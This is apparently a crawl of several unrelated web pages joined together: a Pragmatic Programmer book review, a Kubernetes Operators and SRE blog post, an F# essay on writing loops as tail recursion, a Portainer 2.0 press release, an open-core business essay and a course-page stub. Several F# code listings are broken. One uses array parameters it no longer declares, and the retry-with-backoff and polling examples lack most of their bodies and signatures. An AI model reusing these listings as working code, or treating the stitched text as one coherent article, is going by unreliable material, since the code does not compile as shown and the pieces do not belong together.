but also integrating the feedback they gathered at this time.</p><p>While the book contains code samples, it's not about teaching you how to code: The authors explain how to improve the <em>process</em> of developing software in a pragmatic way.
It includes plenty of tips that will help you throughout your programming career.</p><p>Some of the traits of pragmatic programmers are their <em>attitude</em> and philosophy of approaching
problems, placing them in its larger context, and taking <em>responsibility</em> for everything that they do.</p><p>I've only read the book 3 years into my career as a software developer, but
I'm sure that I will be able to appreciate the book, even more, when I read it again in a year or so.</p><p>I'd recommend it to all software developers who are serious about improving their skills.
However, while it contains a lot of useful advice, I feel like if you're just starting out with
programming, you might not come to appreciate all the wisdom that the book offers.</p><p>If you want to buy the book, you can get it <a href="https://amzn.to/2D4Nf4K" target="_blank" rel="nofollow noopener noreferrer">here on Amazon</a> (affiliate link).</p><h2 id="favorite-topics"><a href="#favorite-topics" aria-label="favorite topics permalink"></a>Favorite topics</h2><p>The Pragmatic Programmer has a total of 53 topics. As with any non-fiction book, some ideas resonate with the reader and others don't.</p><p>I want to share a short summary of each of my favorite topics here and how I integrated them into my work. These are the topics that I liked the most after reading
the book for the first time, but I'm sure that if I read the book again a few years from now, my takeaways will be different.</p><ul><li><a href="#its-your-life">It's your life</a></li><li><a href="#knowledge-portfolio">Knowledge portfolio</a></li><li><a href="#orthogonality">Orthogonality</a></li><li><a href="#tracer-bullets">Tracer bullets</a></li><li><a href="#the-basic-tools">The basic tools</a></li><li><a href="#dead-programs-tell-no-lies">Dead programs tell no lies</a></li><li><a href="#programming-by-coincidence">Programming by coincidence</a></li><li><a href="#test-to-code">Test to code</a></li><li><a href="#pragmatic-starter-kit">Pragmatic starter kit</a></li></ul><undefined></undefined><h3 id="its-your-life"><a href="#its-your-life" aria-label="its your life permalink"></a>It's your life</h3><p>This topic is at the very beginning of the book and has a motivational vibe to it. Many developers that Dave and Andi have talked to
are frustrated with their jobs or the technology they're working with.</p><p>The authors highlight the fact that software development is one of the best careers to have nowadays since developers usually are well paid, can
work from anywhere in the world, and have a lot of freedom in their jobs.</p><p>If you're not happy with the job you're working right now, you can try to fix it by talking to your boss or find yourself another job easily.</p><p>Given how privileged software developers are, there's no excuse for not living the life you want. If you're proactive
and stay on top of your game, you'll be rewarded with a lot of opportunities by the industry.</p><h3 id="knowledge-portfolio"><a href="#knowledge-portfolio" aria-label="knowledge portfolio permalink"></a>Knowledge portfolio</h3><p>The knowledge portfolio of every developer is like a regular investment portfolio: If you invest in it regularly, you will reap the benefits of
that later on.</p><p>I found this analogy to be the most powerful in this book since I read it at a time where I wasn't developing my programming skills any further
and I felt like I was hitting a glass ceiling. I wasn't investing in my knowledge portfolio and I came to a point where I noticed the results of that.</p><p>Regularly investing in yourself by reading non-fiction books will help you stay curious and
motivated about your profession (they don't have to be all programming related).</p><p>It also helps to discover more things that you don't know, making <em>Unknown</em> Unknowns, <em>Known</em> Unknowns. This idea is not from the book, but I think it is related.</p><p>The more you learn about a certain topic, the more you see the complexity in it and the more you see the little you know about it.
You can read more about this in this <a href="https://uxdesign.cc/the-knowns-and-unknowns-framework-for-design-thinking-6537787de2c5" target="_blank" rel="nofollow noopener noreferrer">Medium post</a>.</p><p>The authors suggest you invest in your portfolio by doing the following things:</p><ul><li>Learn at least one new language every year</li><li>Read a technical book each month</li><li>Read nontechnical books, too</li><li>Take classes</li><li>Participate in local user groups and meetups</li><li>Stay current (by reading news and posts online)</li></ul><p>You don't have to do all of them, but consistently developing yourself with these suggestions will definitely help you expand your portfolio.</p><blockquote><p>To get notified about articles like this one, <a href="https://felixgerschau.substack.com/" target="_blank" rel="nofollow noopener noreferrer">subscribe to my email newsletter</a>.</p></blockquote><h3 id="orthogonality"><a href="#orthogonality" aria-label="orthogonality permalink"></a>Orthogonality</h3><p>This is a term borrowed from geometry. We probably know this concept under names like <strong>modularity</strong> or <strong>layered systems</strong>. In the end, all of them refer to a system
whose components are loosely coupled, meaning that the components don't have a lot of dependencies.</p><p>In orthogonal systems, it's easy to change one component without the fear of breaking something on the other end. These systems are also easier to test.</p><p>Thinking about orthogonality during the development or design stage of a system can help a lot in making the system easier to work with in the future and prevent bugs.</p><h3 id="tracer-bullets"><a href="#tracer-bullets" aria-label="tracer bullets permalink"></a>Tracer bullets</h3><p>In the shooting scenes of any action movie, you can often see the path of the bullets. Bullets that mark the path they've taken are called <em>tracer bullets</em>.</p><p>Tracer bullets are used in real-world combat as well because they help to aim under difficult environments by providing <strong>immediate feedback under real circumstances</strong>.
They are not supposed to hit the target right away, but the fast feedback allows the gunner to adjust the aim.</p><p>The equivalent in software development is to <strong>get a small part of the system working as soon as possible</strong> and asking for feedback from users and stakeholders.</p><p>Advantages of the tracer bullet approach are:</p><ul><li><p>Early and visible results for your users and sponsors.</p></li><li><p>Developers have a structure to build upon.</p></li><li><p>The project becomes an <strong>integration platform</strong>:</p><p>New changes are integrated into an already working system.</p></li></ul><p>The alternative to the "tracer bullet approach" would be writing each module of the system separately, connecting them in the end together, and test the whole
system at the very end of the project.</p><p>Tracer bullets aren't meant to be prototypes. They're meant to get a stable version of a feature or aspect of the final system that will be the backbone for future developments.</p><p>Just like with the bullets, you won't always hit the target at your first shot. Users or stakeholders might not like the result, but the whole idea of this is to
get this feedback at the beginning of the project rather than at the end.</p><h3 id="the-basic-tools"><a href="#the-basic-tools" aria-label="the basic tools permalink"></a>The basic tools</h3><p>This chapter of the book contains an overview of the tools that every programmer should use. The authors compare programming tools to the tools of a woodworker,
which also inspired the cover of the book.</p><p>Woodworkers use a variety of tools, each of them having its specific purpose. They use tools like rules, drills, clamps, and many more.
The woodworker knows when to use which tools and has mastered how to use it.</p><p>In programming, we have our own tools that we need to get the job done. These tools amplify our talent by increasing productivity.</p><p>In the book, they advise against the usage of a single power tool, an IDE, and encourage you to use the tools that an IDE uses behind the scenes.</p><p>The tools covered in the book fall into the following categories:</p><ul><li>The power of plain text</li><li>Shell games (Unix commands)</li><li>Version control</li><li>Power Editing (Your text editor)</li><li>Debugging</li><li>Engineering daybooks</li></ul><h4 id="dont-rely-on-gui-environments"><a href="#dont-rely-on-gui-environments" aria-label="dont rely on gui environments permalink"></a>Don't rely on GUI environments</h4><p>Unix commands are so powerful because each of them has one single purpose and they can be combined through pipes, which
opens up an infinite amount of possibilities to what you can do with them. It's to the programmer what the workbench is to the woodworker.</p><p>Using the shell allows you to automate things and combine commands in such a flexible way that GUIs can't keep up with.</p><h3 id="dead-programs-tell-no-lies"><a href="#dead-programs-tell-no-lies" aria-label="dead programs tell no lies permalink"></a>Dead programs tell no lies</h3><p><em>A dead program normally does a lot less damage than a crippled one.</em></p><p>The tip of the authors for this topic is to <strong>crash early</strong>.</p><p>Why? Because if you don't, your program will maybe <em>look</em> like it's working correctly but returns slightly wrong results due to the system being in
a wrong state.</p><p>You can avoid this by crashing early and often. This will help you to find the root of the bug faster and it will be more apparent when something is wrong with
the program.</p><p>Wrapping your code in <code>try catch</code> statements might keep the program running, but the subtle bugs that are the result of that are much harder to catch.</p><blockquote><h4 id="data-validation-in-mobx-state-tree"><a href="#data-validation-in-mobx-state-tree" aria-label="data validation in mobx state tree permalink"></a>Data validation in Mobx-State-Tree</h4><p>This is one of the aspects I like about <a href="https://github.com/mobxjs/mobx-state-tree" target="_blank" rel="nofollow noopener noreferrer">Mobx-State-Tree</a>, a frontend state management tool.
It crashes early by validating the data before adding it to the store that contains all the data on the fronted.</p><p>At first, this seemed annoying to me, since the app crashed as soon as the backend returned the wrong data. After giving it a second thought, this approach is
much better than keeping the program running.</p><p>The alternative would be that, after receiving an unexpected null value, for example, the app crashes anyway
because I'm trying to read a property from <code>undefined</code> (JavaScript equivalent to a NullPointerException).</p><p>Having worked with it for nearly 2 years now, I can say that with this helped me on multiple occasions to track down bugs faster than it would've taken me
without validating the data.</p></blockquote><h3 id="programming-by-coincidence"><a href="#programming-by-coincidence" aria-label="programming by coincidence permalink"></a>Programming by coincidence</h3><p><em>Don't assume it, prove it.</em></p><p>Programming by coincidence means that you're making guesses about the functions and interfaces that you're using. It might work for a while, but since you
don't <strong>know</strong> what you're working with, bugs can show up, which will be difficult to track down later on.</p><p>The result is that, whether your code is working or not, you don't know <em>why</em>.</p><p>As a remedy to programming by coincidence, you shouldn't guess what's the purpose of a given interface but read the documentation. If you can't rely on the documentation,
or there isn't one to begin with, document (and test) your assumptions.</p><p>I found the advice of this topic to be helpful when working on projects with a messy codebase where functions would have unexpected side effects.</p><h3 id="test-to-code"><a href="#test-to-code" aria-label="test to code permalink"></a>Test to code</h3><p><em>Testing is not about finding bugs.</em></p><p>This topic is all about testing and why we test our code in the first place. Especially unit tests help us think about our code in a more …</p></div></div></div></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Kubernetes is an open-source project that “containerizes” workloads and services and manages deployment and configurations. Released by Google in 2015, Kubernetes is now maintained by the <a href="https://www.cncf.io/">Cloud Native Computing Foundation</a>. Since its release, it has become a worldwide phenomenon. The majority of <a href="https://www.zdnet.com/article/kubernetes-jumps-in-popularity/">cloud native companies use</a> it, SaaS vendors offer commercial prebuilt versions, and there’s even an annual <a href="https://events.linuxfoundation.org/kubecon-cloudnativecon-europe/">convention</a>!<br></p><p>What has made Kubernetes become such a fundamental service? A major factor is its automation capabilities. Kubernetes can automatically make changes to the configuration of deployed containers or even deploy new containers based on metrics it tracks or requests made by engineers. Having Kubernetes handle these processes saves time, eliminates toil, and increases consistency.<br></p><p>If these benefits sound familiar, it might be because they overlap with the philosophies of SRE. But how do you incorporate the automation of Kubernetes into your SRE practices? In this blog post, we’ll explain the Kubernetes Operator—the Kubernetes function at the heart of customized automation—and discuss how it can evolve your SRE solution.</p><h3>What the Kubernetes Operator can do</h3><p>In <a href="https://www.amazon.com/Kubernetes-Operators-Automating-Container-Orchestration/dp/1492048046"><em>Kubernetes Operators: Automating the Container Orchestration Platform</em></a>, authors Jason Dobies and Joshua Wood describe an Operator as “an automated Site Reliability Engineer for its application.” Given an SRE’s multifaceted experience and diverse workload, this is a bold statement. So what exactly can the Operator do?</p><h4>Kubernetes Operators complete sophisticated tasks</h4><p>The Operator can complete complex tasks in order to achieve the desired changes in the application’s output. It can automatically handle such tasks as:<br></p><ul role="list"><li>Deploying applications</li><li>Updating applications to new versions</li><li>Reconfiguring application settings</li><li>Scaling applications up and down depending on usage</li><li>Failure handling</li><li>Setting up monitoring infrastructure<br></li></ul><p>Without Kubernetes Operators, engineers would need to complete these tasks. Automating them saves time and toil, and makes the procedures and results consistent.<br></p><h4>Kubernetes Operators control custom resources and applications</h4><p>Kubernetes allows you to create and define custom resources based on specific applications. The custom resource is a data object generated by your application containing metrics on the application's state. Imagine you have an application that produces new server instances based on usage. You could define your custom resource to check RAM and disk space for each new instance. You can also define a custom resource as a target that the application is trying to match. The Kubernetes Operator can then control the application to achieve the target custom resource; if the application is spinning up servers that have insufficient RAM or disk space, the Operator can reconfigure the settings to match the desired amount.<br></p><h4>Kubernetes Operators make stateful decisions</h4><p>The Kubernetes Operator is able to modify the configuration and usage of an application based on the application’s output. This is determined by the custom resources defined for that application. Custom resources showing the desired state and custom resources showing the current state form a loop. The Operator observes the current state and then takes actions that will make the application produce the desired state. After the actions are executed, the current state is reevaluated and the loop begins again.&nbsp;<br></p><p>For example, a custom resource could define the desirable state of a new server instance as some amount of load capability based on its physical resources.The Operator would then adjust the configuration until new instances reached these standards.</p><h3>Kubernetes Operators and SRE</h3><p>If you’re using Kubernetes, you’ll find that building and implementing Operators aligns with your SRE goals.</p><h4>Operator monitoring, SLIs, and SLOs</h4><p>When developing the custom resource for your application, you need to choose which signals from the application’s output will be monitored by the resource and which targets the Operator will steer the application toward. This is similar to creating <a href="https://www.blameless.com/blog/slis-understand-users-needs">SLIs</a> and <a href="https://www.blameless.com/blog/service-level-objectives-slos-lessons-learned">SLOs</a>.&nbsp;<br></p><p>The process of determining metrics with greatest impact is similar for Operators and SLIs. In the <em>Kubernetes Operators</em> textbook, Dobies and Wood suggest looking first at the “four golden signals” (<a href="https://landing.google.com/sre/sre-book/chapters/monitoring-distributed-systems/">a concept from Google’s SRE book</a>) to determine what the Operator should monitor. These are:</p><ul role="list"><li>Latency</li><li>Traffic</li><li>Errors</li><li>Saturation<br></li></ul><p>Creating Operators for your applications will help you understand what SLIs and SLOs should be set for them. Likewise, setting SLIs and SLOs can help you understand what your Operators should monitor.<br></p><p>You might notice that when servers are overloaded, your customers are unhappy with the application’s availability.<br></p><p>You can set a custom resource to monitor the disk space available. At 5% remaining capacity, your custom resource will spin up new server instances, giving your customers better service. Your SLI will be based on availability and will monitor disk space. Your SLO might dictate that you need to achieve 99.9% availability to keep your customers happy, informing the Operator’s intervention points.</p><h4>Automating SRE application deployment</h4><p>Your SRE practice will involve applications being deployed on a regular basis for each new instance of a service. For example, you may want to deploy a monitoring application every time you implement a new area of system architecture. Kubernetes Operators can expedite and automate this process. For monitoring, the <a href="https://coreos.com/blog/the-prometheus-operator.html">Prometheus Operator</a> is one of the first Operators developed by Kubernetes. It automatically deploys and controls a new instance of the open-source monitoring software <a href="https://prometheus.io/">Prometheus</a> onto any targeted clusters.<br></p><p><a href="https://www.blameless.com/blog/choosing-sre-tools">SRE tools</a> represent an investment in reliability. The time spent implementing them is paid for by the time they save. Creating Operators is a similar investment. By creating Operators, you save time on each deployment. Furthermore, deployments are consistent and reliable. Your SRE practices have less overhead and can scale with your organization.</p><h4>Operators and incident management</h4><p>Operators can be set up to make adjustments to handle failure. If the application’s custom resource varies from the desired result, the Operator will make changes to compensate until the desired state is achieved. The cause of the variation is irrelevant to the Operator. It only operates based on the current and desired states. You will still need to work through an incident retrospective to bubble up contributing factors.<br></p><p>When developing your incident response plan, the behavior of your Operators can be a valuable resource. If you know that the Operator will automatically try to correct the behavior, you can incorporate that into your expectations and procedures. For example, if you have an incident response plan for oversaturated servers, your Operator could spin up new server instances or reconfigure load balancing. Your response plan would take this into account, saving you some troubleshooting steps and allowing you to focus on the originating issue. By combining Operators and <a href="https://www.blameless.com/blog/runbook-automation-best-practices">automated runbooks</a>, you can minimize the amount of manual escalation and resolve many incidents without human intervention. As automation is another core goal of SRE, this is another way that Kubernetes Operators fit into your reliability strategy.<br></p><p>As you shift your services to a container-based model and Kubernetes becomes more fundamental to your DevOps practices, it’s important to incorporate Operators into your reliability strategy. Operators allow you to extend Kubernetes with custom resources and responses, allowing for more automation and less toil.&nbsp;<br></p><p>If you enjoyed this post, check out these resources:</p><ul role="list"><li><a href="https://www.blameless.com/resources/webinar-modern-metrics">Webinar: Modern Metrics to Understand Operational Health</a></li><li><a href="https://www.blameless.com/blog/how-to-choose-monitoring-tools">How to Choose Monitoring Tools for DevOps and SRE</a></li><li><a href="https://www.blameless.com/blog/incident-classification">How to Classify Incidents</a></li></ul></div></div>]]>

<p>It’s a fresh new day at work, and you want to find the dot product of two arrays (that is, the sum of the product of the pairs of elements). You’re using your favourite language, <a href="https://en.wikipedia.org/wiki/F_Sharp_(programming_language)">F#</a>. You’re allergic to <code>Seq.zip</code> (maybe you’re terrified of virtual calls or something), and <code>Array.zip</code> just allocates too much memory. Also, you want to make sure you can bail out of the iteration early; what if someone tells you at the last minute that you have to stop if you see the number <code>100</code>?</p>
<p>Cracking your knuckles, the following pours from your fingertips:</p>
<div>
<pre><span>type</span> <span>Index</span> <span>=</span> <span>int</span>

<span>let</span> truncatedDotProduct
    <span>(</span>shouldContinue <span>:</span> <span>Index</span> <span>-&gt;</span> <span>int</span> <span>-&gt;</span> <span>int</span> <span>-&gt;</span> <span>bool</span><span>)</span>
    <span>(</span>xs <span>:</span> <span>int</span> <span>array</span><span>)</span>
    <span>(</span>ys <span>:</span> <span>int</span> <span>array</span><span>)</span>
    <span>:</span> <span>int</span>
    <span>=</span>
    <span>let</span> <span>mutable</span> ans <span>=</span> <span>0</span>
    <span>let</span> <span>mutable</span> <span>(</span>i <span>:</span> <span>Index</span><span>)</span> <span>=</span> <span>0</span>
    <span>while</span> <span>(</span>shouldContinue i xs<span>.[</span>i<span>]</span> ys<span>.[</span>i<span>])</span> <span>do</span>
        ans <span>&lt;-</span> ans <span>+</span> <span>(</span>xs<span>.[</span>i<span>]</span> <span>*</span> ys<span>.[</span>i<span>])</span>
    ans
</pre>
</div>
<p>Easy, of course! And then you write the unit tests and discover how truly exquisite the infinite loop is that you have made.</p>
<p>With a gentle sigh of one who has arisen bright and refreshed only to discover the computer in a sullen and recalcitrant mood, you insert the line that makes everything work.</p>
<div>
<pre><span>type</span> <span>Index</span> <span>=</span> <span>int</span>

<span>let</span> truncatedDotProduct
    <span>(</span>shouldContinue <span>:</span> <span>Index</span> <span>-&gt;</span> <span>int</span> <span>-&gt;</span> <span>int</span> <span>-&gt;</span> <span>bool</span><span>)</span>

    <span>:</span> <span>int</span>
    <span>=</span>
    <span>let</span> <span>mutable</span> ans <span>=</span> <span>0</span>
    <span>let</span> <span>mutable</span> <span>(</span>i <span>:</span> <span>Index</span><span>)</span> <span>=</span> <span>0</span>
    <span>while</span> <span>(</span>shouldContinue i xs<span>.[</span>i<span>]</span> ys<span>.[</span>i<span>])</span> <span>do</span>
        ans <span>&lt;-</span> ans <span>+</span> <span>(</span>xs<span>.[</span>i<span>]</span> <span>*</span> ys<span>.[</span>i<span>])</span>
        <span>// How weary, stale, flat, and unprofitable</span>
        <span>// seem to me all the uses of this world</span>
        i <span>&lt;-</span> i <span>+</span> <span>1</span>
    ans
</pre>
</div>
<p>Now the tests pass, and you can stride forward into a glorious day of productivity.</p>
<p>But wouldn’t it have been lovely if this mistake hadn’t happened?</p>
<h2 id="going-loopy">Going loopy</h2>
<p>The mistake was that we introduced a piece of state, but never changed it. A sufficiently advanced compiler can warn us about a variable that is set but never used – but the problem still remains in general. (What if we had printed the iteration variable, and therefore used it? Or what if we had a slightly more complicated computation for which we legitimately performed some mutation to the state in our loop body, but still forgot to do the final increment?)</p>
<p>With a small change to the shape of this function, we can make the bug so obvious that we would never dream of making it.</p>
<div>
<pre><span>type</span> <span>Index</span> <span>=</span> <span>int</span>

<span>let</span> truncatedDotProduct
    <span>(</span>shouldContinue <span>:</span> <span>Index</span> <span>-&gt;</span> <span>int</span> <span>-&gt;</span> <span>int</span> <span>-&gt;</span> <span>bool</span><span>)</span>
    <span>(</span>xs <span>:</span> <span>int</span> <span>array</span><span>)</span>
    <span>(</span>ys <span>:</span> <span>int</span> <span>array</span><span>)</span>
    <span>:</span> <span>int</span>
    <span>=</span>
    <span>let</span> <span>rec</span> go <span>(</span>ans <span>:</span> <span>int</span><span>)</span> <span>(</span>i <span>:</span> <span>Index</span><span>)</span> <span>=</span>
        <span>if</span> shouldContinue i xs<span>.[</span>i<span>]</span> ys<span>.[</span>i<span>]</span> <span>then</span>
            go <span>(</span>ans <span>+</span> <span>(</span>xs<span>.[</span>i<span>]</span> <span>*</span> ys<span>.[</span>i<span>]))</span> <span>(</span>i <span>+</span> <span>1</span><span>)</span>
        <span>else</span>
            ans

    go <span>0</span> <span>0</span></pre>
</div>
<p>Now we are forced to declare explicitly that the index in the next iteration will be <code>i + 1</code>. Merely omitting this decision is not an option any more, because the compiler will force us to give a second argument to <code>go</code> whenever we invoke it.</p>
<p>As an added bonus, the termination condition of the loop has been tidied up; I would argue that it’s now easier to see that if <code>shouldContinue</code> fails, we return the value we’d got up to <em>before</em> the current index. (Admittedly, that one is more of a matter of taste; maybe you personally find it easier to understand the termination condition of the explicit <code>while</code> loop.)</p>
<p>And in a language like F#, we don’t lose any performance using this approach. A language with <a href="https://en.wikipedia.org/wiki/Tail_call">tail-call optimisation</a> will optimise away the recursive call into an imperative loop behind the scenes; in fact, the recursive and the imperative code may well boil down to exactly the same machine code. (By contrast, some languages like Python lack tail-call optimisation, so in Python this approach is liable to end in a stack overflow.)</p>
<h2 id="backing-off">Backing off</h2>
<p>For another prime example, consider a famous saying:</p>
<blockquote><p><em>If at first you don’t succeed, try, try again.</em></p></blockquote>
<p>What is less often noted is that one should wait some period of time in between each retry.</p>
<p>Of course, there are libraries which do this for you (<a href="https://github.com/App-vNext/Polly">Polly</a>, for example). But for the sake of argument, let’s say we want to write a simple exponential backoff ourselves. (We’ll mock out the <code>sleep</code> function, to allow us to test the logic more easily; it’ll probably be given as <code>System.Threading.Thread.Sleep</code> at the call site, but nobody wants to be calling <code>Thread.Sleep</code> in a unit test.)</p>

</div>
<p>Easy enough, but let’s give it the recursive treatment:</p>
<div>
<pre><span>open</span> <span>System</span>

<span>let</span> doThingRetryingWithBackoff<span>&lt;</span><span>'</span>err<span>&gt;</span>

    <span>=</span>
    <span>let</span> <span>rec</span> go <span>(</span>retriesPerformed <span>:</span> <span>int</span><span>)</span> <span>=</span>

                go newRetries

    go <span>0</span>
</pre>
</div>
<p>No need for the sad <code>isDone</code> sentinel here! Since looping was an active choice (an explicit call to <code>go</code>), we were free simply to choose not to loop at any point, and specifically at the point where <code>doThing</code> had returned successfully.</p>
<h2 id="the-barest-essentials">The barest essentials</h2>
<p>Sometimes we don’t even need any state at all!</p>
<div>
<pre><span>open</span> <span>System</span>

<span>let</span> pollInfinitely<span>&lt;</span><span>'</span>a<span>&gt;</span>
    <span>(</span>sleep <span>:</span> <span>TimeSpan</span> <span>-&gt;</span> <span>unit</span><span>)</span>

        doThings values
        sleep <span>(</span><span>TimeSpan</span>.<span>FromSeconds</span> <span>5</span><span>.)</span>
</pre>
</div>
<p>Or, in the shiny new world which is free of <code>while</code>:</p>
<div>
<pre><span>open</span> <span>System</span>

<span>let</span> pollInfinitely<span>&lt;</span><span>'</span>a<span>&gt;</span>
    <span>(</span>sleep <span>:</span> <span>TimeSpan</span> <span>-&gt;</span> <span>unit</span><span>)</span>
    <span>(</span>poll <span>:</span> <span>unit</span> <span>-&gt;</span> <span>'</span>a<span>)</span>
    <span>(</span>doThings <span>:</span> <span>'</span>a <span>-&gt;</span> <span>unit</span><span>)</span>
    <span>:</span> <span>unit</span>
    <span>=</span>
    <span>let</span> <span>rec</span> go <span>()</span> <span>=</span>
        <span>let</span> values <span>=</span> poll <span>()</span>
        doThings values
        sleep <span>(</span><span>TimeSpan</span>.<span>FromSeconds</span> <span>5</span><span>.)</span>
        go <span>()</span>

    go <span>()</span>
</pre>
</div>
<p>This example looks too simple to be of any use, and maybe indeed it is; and of course in real life there is <code>System.Timers.Timer</code> which solves this problem better. (This is only a toy example.)</p>
<p>But I would argue that once you’re familiar with the general pattern, this is a natural way to express the loop. Moreover, it is extremely extensible: if we decide we don’t actually want to loop forever, it’s trivial to add extra state by inserting it as parameters to <code>go</code>, and the compiler will try its best to help us use it correctly. (By contrast, with the <code>while</code> loop and mutable state, we are on our own: the compiler can’t know what we had in mind for the state.<br>
It will freely let us either modify the state when we didn’t want to, or fail to modify it when we did want to.)</p>
<h2 id="winding-up">Winding up</h2>
<p>Though it may look very odd at first sight, it soon becomes quite natural to think about loops in this recursive way. It allows you to express more of the problem in the type system, helping the compiler to point out when you’ve done things like “adding a new piece of state but forgetting to use it everywhere you wanted it”. It also makes the act of looping into a conscious choice at each stage; if you’ve ever longed for the good old days of <code>goto</code> to break out of loops, this actually gives you back something of that flavour, but much more safe!</p>
<p>Making the loop state immutable makes it easier to reason about the invariants and behaviour of the loop, and helps you write safer programs fast.</p>

		<p><strong>Auckland, New Zealand, August 31, 2020</strong> – Open source software company, <a href="https://www.portainer.io/">Portainer.io</a>, has launched version 2.0 of its platform which includes support for the Kubernetes container orchestrator, for the first time.</p>
<p>In three years, Portainer.io has over half a million regular Docker Swarm users with its 1.X version. It is anticipated the addition of support for Kubernetes will further accelerate growth for the start up.</p>
<p>Portainer makes operating container platforms easy. It provides a simple, click-to-configure interface which removes all of the unnecessary complexity and negates the need for users to learn complex syntax. Portainer users can now deploy and manage notoriously complicated applications on a Kubernetes platform, quickly and easily. Users no longer need to know how to write YAML or understand the Kubernetes CLI or API. In addition to Kube, Portainer continues to operate across all major orchestration systems including Docker Swarm and Azure ACI.</p>
<p>According to Portainer.io CEO and Co-Founder, Neil Cresswell, Portainer CE 2.0 is a hugely important release for Portainer; “It takes the company back to its true open source roots as Portainer CE 2.0 no longer includes ‘Extensions’, Portainer’s previously paid-for features,” he explains.</p>
<p>“While the addition of Kubernetes embraces our ability to support the full breadth of the container management community. Portainer CE 2.0 also lays the foundational platform for Portainer Business, Portainer’s soon to be released premium service for business customers.”</p>
<p>Last month Portainer attracted an initial<a href="https://www.portainer.io/2020/08/portainer-io-closes-us1-2-million-seed-financing/"> seed funding round</a> of US$1.2 million to fast-track its growth plans.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
				<p>Compared to a few years ago, there’s no doubt that open source vendors can be financially successful. Red Hat paved the way. In the last quarter before the IBM acquisition, Red Hat achieved a $3.7B annualized revenue run rate<sup>[1]</sup>. <strong>That’s incredible.</strong> Despite Red Hat’s success, the overwhelming majority of today’s open source vendors are not following Red Hat’s footsteps. For good reasons, most companies follow an open core model (selling proprietary software that extends the functionality of the “open core” aka the open source project). It provides more flexibility and allows for better monetization in most cases.</p><p>When I reflect on the many conversations I had with technical startup founders over the last year, I see another sea change happening: <strong>It’s less about the open source movements' ideals and philosophical beliefs.</strong> What matters to this new “class” of founders is whether using open source makes their company more successful or not. Some of them push it to an extreme and see it as their primary differentiator. “<em>We are like x, but open source</em>”. I don’t believe this theme will last for long but might provide an edge in certain markets for a short period of time. The approach can be powerful if paired with another unique differentiator (e.g., Mattermost = Slack but self-managed/on-premise + open source).</p><p>Some people believe that open source software will take over the world. I disagree. <strong>Open source doesn’t necessarily result in better products.</strong> More importantly, most non-developers<sup>[2]</sup> don’t care about open source. It’s irrelevant to their purchase decisions. It’s not driving consumer behavior. The reason is straightforward. If you don’t have the desire or skills to download and run an open source project, there’s no advantage over a comparable product that’s free. There is one caveat to this. Developers can bring non-developer products into a company if they play an important role in adopting these products (e.g., Stripe as a payment provider).</p><p>If you consider building a B2B company that serves a technical audience, open source might be a powerful tool for you. Most likely, you will pick open core<sup>[3]</sup> as a monetization strategy. <strong>Open core has a “built-in conflict” between the open source project, the community, and the commercial vendor.</strong> By definition, if you extend the “open core” with proprietary functionality (so that you can monetize), you hold functionality from the open source project. Managing this conflict is crucial for the success of your company. It will help tremendously if you derive what goes into open source vs. what’s proprietary from first principles.</p><figure><img src="https://www.moritzplassnig.com/content/images/2020/09/Open-Source-vs.-Proprietary-v2---Cut.jpg" alt="" srcset="https://www.moritzplassnig.com/content/images/size/w600/2020/09/Open-Source-vs.-Proprietary-v2---Cut.jpg 600w, https://www.moritzplassnig.com/content/images/size/w1000/2020/09/Open-Source-vs.-Proprietary-v2---Cut.jpg 1000w, https://www.moritzplassnig.com/content/images/size/w1600/2020/09/Open-Source-vs.-Proprietary-v2---Cut.jpg 1600w, https://www.moritzplassnig.com/content/images/2020/09/Open-Source-vs.-Proprietary-v2---Cut.jpg 2206w" sizes="(min-width: 720px) 720px"></figure><p>There’s one important question you should ask yourself for every new capability:</p><p><strong>Who is the primary user of this feature?</strong></p><p>If the user/beneficiary of a feature is the <strong>developer</strong>, it should always go into 	open source. The better your open source project is, the more adoption you will see. In case there are multiple, competitive projects in a given problem space, it will also help you differentiate and win<sup>[4]</sup>. All of that results in a larger addressable market for you. As an open source vendor, you are constrained by the adoption of your open source project. Assuming you hold back those developer features, and try to monetize them, you will not generate a lot of revenue. The money is somewhere else (manager, executive). If you want to monetize the developer adoption, offer a SaaS product.</p><p>If the user/beneficiary of a feature is the <strong>manager</strong>, you can most likely keep the capability proprietary. The most important exception to this rule is if engineering managers are the primary users of the product (e.g., a tool that helps the manager manage). Another way to think about this is the following: Within an organizational hierarchy, you monetize the top (exec/manager) and contribute the bottom capabilities (practitioner/manager) to open source.</p><p>If the user/beneficiary of a feature is an <strong>executive</strong>, you keep the capability proprietary.</p><p><strong>There are two reasons for this framework.</strong></p><p>The obvious one is the monetization potential of a given capability. Executives can spend more money ($$$), than managers ($$), who can spend more than practitioners ($). You lose very little by not monetizing the persona with the least monetization potential. In return, you are more likely to get a lot of bottom-up adoption, making selling to executives/managers easier. Additionally, offering a SaaS product allows you to monetize the practitioner segment at least partially.</p><p>The second reason is less obvious but equally critical. Executives won’t contribute to your open source project. Managers will do it rarely. If they need a specific capability, they won’t open a PR towards your open source project. In some cases, they might ask an engineer in their organization to build it for them, but that’s the exception, and rarely the case if you offer the capability for a reasonable price. Developers are the opposite. If they miss a capability, they will be inclined to contribute. This is fantastic and exactly what you want because it increases the value of your open source project. Most important, rejecting a PR from a developer for a developer feature (because you want to monetize it) will inadvertently create conflict. Other developers will be less inclined to contribute, causing your open source project to suffer. You won’t have a thriving and growing community.</p><p><strong>Open Core is a terrific business model if you manage the inherent conflict about what to open-source and what to keep proprietary well.</strong></p><figure><blockquote data-width="550"><p lang="en" dir="ltr">Open Core - Monetize Through First Principles<a href="https://t.co/mWOab4nYbD">https://t.co/mWOab4nYbD</a></p>— Moritz Plassnig (@moritzplassnig) <a href="https://twitter.com/moritzplassnig/status/1299876092745052161?ref_src=twsrc%5Etfw">August 30, 2020</a></blockquote>

<p><img src="http://janmidtgaard.dk/quickcheck/testloop.png" alt="test loop"></p>
<p>This is a mirror of the elective course <a href="https://odin.sdu.dk/sitecore/index.php?a=fagbesk&amp;id=37292&amp;listid=2858&amp;lang=en">'SM2-TES: Functional Programming and Property-Based Testing'</a> offered in the spring 2019 on the MSc education in Software Engineering at the <a href="https://www.sdu.dk/en/Om_SDU/Institutter_centre/Mmmi_maersk_mckinney_moeller.aspx">Maersk Mc-Kinney Moller Institute</a>, <a href="https://www.sdu.dk/en/">University of Southern Denmark</a>.</p>
